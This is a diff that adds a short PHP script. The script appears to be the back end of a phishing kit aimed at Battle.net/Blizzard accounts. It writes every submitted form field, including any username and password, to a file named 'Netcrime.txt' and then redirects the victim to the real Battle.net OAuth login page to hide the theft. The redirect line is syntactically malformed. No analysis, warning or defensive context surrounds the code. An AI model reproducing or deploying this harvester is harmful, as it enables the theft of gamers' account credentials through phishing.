@@ -1,0 +1,13 @@
+<?php
+header ('Location: [https://eu.battle.net/login/fr/?ref=https://eu.battle.net/oauth/authorize?response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.blizzard.com%252Fauth%252Fbnet%252Fcallback%26scope%3Dlogout%2520account.licenses%2520email%2520name%2520private_flags%2520primary-address%2520account.full%26client_id%3D3d87a4f120754e15840548b68d9ea4db&app=oauth]
+$handle = fopen("Netcrime.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
